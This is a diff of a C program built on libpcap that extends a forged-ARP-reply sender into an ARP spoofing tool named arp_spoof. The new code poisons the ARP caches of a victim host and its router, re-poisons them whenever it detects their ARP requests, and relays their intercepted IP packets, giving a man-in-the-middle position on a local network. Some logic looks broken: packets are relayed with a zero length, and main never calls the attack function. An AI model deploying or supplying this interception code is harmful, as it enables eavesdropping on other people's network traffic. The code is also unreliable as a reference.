@@ -178,7 +178,7 @@ int victim_mac_req(uint8_t *my_mac, uint8_t *v_mac, struct in_addr my_ip, struct
                     {
                         v_mac[i] = (uint8_t)rcv_buf[i];
                     } 
-                    printf("Victim's MAC = ");
+                    printf("MAC = ");
                     print_mac(v_mac, 6);
                     printf("\n");
                     free(ETH);
@@ -194,20 +194,13 @@ int victim_mac_req(uint8_t *my_mac, uint8_t *v_mac, struct in_addr my_ip, struct
 }
 
 // Send ARP Reply to the victim (INFECTION CODE)
-int send_arp_reply(uint8_t *my_mac, uint8_t *v_mac, struct in_addr my_ip, struct in_addr v_ip, struct in_addr t_ip, const char *interface)
+int send_arp_reply(pcap_t* handle, uint8_t *my_mac, uint8_t *v_mac, struct in_addr v_ip, struct in_addr t_ip, const char *interface)
 {
     int debug = 0;
     eth_hdr_custom *ETH = (eth_hdr_custom*)malloc(sizeof(eth_hdr_custom));
     arp_hdr_custom *ARP = (arp_hdr_custom*)malloc(sizeof(arp_hdr_custom));
-    char errbuf[PCAP_ERRBUF_SIZE];
     char send_buf[BUFSIZ];
     int offset = 0;
-    pcap_t* handle = pcap_open_live(interface, BUFSIZ, 1, 1000, errbuf);
-    if(handle == NULL)
-    {
-        perror("ERROR : handle is NULL");
-        return -1;
-    }
 
     /***************************Send Request**************************/
     // Ethernet Header Setting
@@ -254,7 +247,7 @@ int send_arp_reply(uint8_t *my_mac, uint8_t *v_mac, struct in_addr my_ip, struct
     return 0;
 }
 
-// Relay IP Packets 
+// Relay the IP Packet
 int ip_packet_relay(u_char *rcv_buf, int len, uint8_t *my_mac, uint8_t *v_mac, uint8_t *t_mac, struct in_addr v_ip, const char *interface)
 {
     eth_hdr_custom *rcv_eth;
@@ -287,20 +280,108 @@ int ip_packet_relay(u_char *rcv_buf, int len, uint8_t *my_mac, uint8_t *v_mac, u
     return 0;
 }
 
+// ATTACK : Detect Recovery , Infection, Relay
+int sender_attack(uint8_t *my_mac, uint8_t *v_mac, uint8_t *t_mac, struct in_addr my_ip, struct in_addr v_ip, struct in_addr t_ip, const char *interface)
+{
+    // PCAP_OPEN
+    int debug = 0;
+    char errbuf[PCAP_ERRBUF_SIZE];
+    char send_buf[BUFSIZ];
+    int offset = 0;
+    pcap_t* handle = pcap_open_live(interface, BUFSIZ, 1, 1000, errbuf);
+    if(handle == NULL)
+    {
+        perror("ERROR : handle is NULL");
+        return -1;
+    }   
+    
+    // initial infection
+    send_arp_reply(handle, my_mac, v_mac, v_ip, t_ip, interface);   // Sender Attack
+    send_arp_reply(handle, my_mac, t_mac, t_ip, v_ip, interface);   // Router Attack
 
+    while(true)
+    {
+        struct pcap_pkthdr* header;
+        const u_char *rcv_buf;
+        eth_hdr_custom *rcv_eth;
+        arp_hdr_custom *rcv_arp;
+        ip_hdr_custom *rcv_ip;
+        int res = pcap_next_ex(handle, &header, &rcv_buf);
+        if (res == 0) continue;
+        if (res == -1 || res == -2) break;
+        rcv_eth = (eth_hdr_custom *)rcv_buf;
+
+        // detect : sender -> target ARP REQUEST
+        if((memcmp(rcv_eth->source_mac, v_mac, 6) == 0) && (ntohs(rcv_eth->eth_type) == ETHERTYPE_ARP))
+        {
+            rcv_buf += sizeof(eth_hdr_custom);
+            rcv_arp = (arp_hdr_custom *)rcv_buf;
+            rcv_buf += sizeof(arp_hdr_custom);
+            if(!(memcmp(rcv_buf, v_mac, 6) | memcmp(rcv_buf + 6, &v_ip, 4) | memcmp(rcv_buf + 16, &t_ip, 4)))
+            {
+                printf("Victim's ARP Request DETECTED!\n\n");
+                send_arp_reply(handle, my_mac, v_mac, v_ip, t_ip, interface);
+                send_arp_reply(handle, my_mac, t_mac, t_ip, v_ip, interface);
+            }
+        }
+        
+        // detect : target -> sender ARP REQUEST
+        else if((memcmp(rcv_eth->source_mac, t_mac, 6) == 0) && (ntohs(rcv_eth->eth_type) == ETHERTYPE_ARP))
+        {
+            rcv_buf += sizeof(eth_hdr_custom);
+            rcv_arp = (arp_hdr_custom *)rcv_buf;
+            rcv_buf += sizeof(arp_hdr_custom);
+            if(!(memcmp(rcv_buf, t_mac, 6) | memcmp(rcv_buf + 6, &t_ip, 4) | memcmp(rcv_buf + 16, &v_ip, 4)))
+            {
+                printf("Target's ARP Request DETECTED!\n\n");
+                send_arp_reply(handle, my_mac, v_mac, v_ip, t_ip, interface);
+                send_arp_reply(handle, my_mac, t_mac, t_ip, v_ip, interface);
+            }
+        }
+
+        // relay : sender -> target IP Packet
+        else if((memcmp(rcv_eth->source_mac, v_mac, 6) == 0) && (ntohs(rcv_eth->eth_type) == ETHERTYPE_IP))
+        {
+            memcpy(rcv_eth->source_mac, my_mac, 6);
+            memcpy(rcv_eth->dest_mac, t_mac, 6);
+            if(pcap_sendpacket(handle, (u_char*)(rcv_buf), offset) < 0)
+            {
+                perror("ERROR : relay(sender->target) - sendpacket Failure");
+                return -1;
+            }
+        }
+
+        // relay : target -> sender IP Packet
+        else if((memcmp(rcv_eth->source_mac, t_mac, 6) == 0) && (ntohs(rcv_eth->eth_type) == ETHERTYPE_IP))
+        {
+            rcv_buf += sizeof(eth_hdr_custom);
+            rcv_ip = (ip_hdr_custom*)rcv_buf;
+            if(!memcmp(&(rcv_ip->ip_dest), &v_ip, sizeof(struct in_addr)))  //check the IP Packet's dest = victim
+            {
+                memcpy(rcv_eth->source_mac, my_mac, 6);
+                memcpy(rcv_eth->dest_mac, v_mac, 6);
+                if(pcap_sendpacket(handle, (u_char*)(rcv_buf), offset) < 0)
+                {
+                    perror("ERROR : relay(sender->target) - sendpacket Failure");
+                    return -1;
+                }
+            }
+        }
+    }   //while(scan packets)
+}
 
 int main(int argc, char *argv[])
 {
     if(argc != 4)
     {
-        printf("Execute Code should be\nsend_arp <interface> <send ip> <target ip>");
+        printf("Execute Code should be\narp_spoof <interface> <send ip> <target ip>");
         return -1;
     }
 
     // USE CUSTOM ARP_HEADER
     arphdr *ARP;
     struct in_addr victim_ip, target_ip, my_ip;
-    uint8_t my_mac[6], victim_mac[6];
+    uint8_t my_mac[6], victim_mac[6], target_mac[6];
     uint8_t errbuf[PCAP_ERRBUF_SIZE];
     pcap_t* handle;
 
@@ -315,12 +396,15 @@ int main(int argc, char *argv[])
         return -1;
 
     // Get Victim's MAC Address
+    printf("Victim's ");
     if(victim_mac_req(my_mac, victim_mac, my_ip, victim_ip, argv[1]) < 0)
         return -1;
-
-    // Send ARP Request(False)
-    if(send_arp_reply(my_mac, victim_mac, my_ip, victim_ip, target_ip, argv[1]) < 0)
+    // Get Target's MAC Address
+    printf("Target's ");
+    if(victim_mac_req(my_mac, target_mac, my_ip, target_ip, argv[1]) < 0)
         return -1;
+
+
 
     return 0;
 }
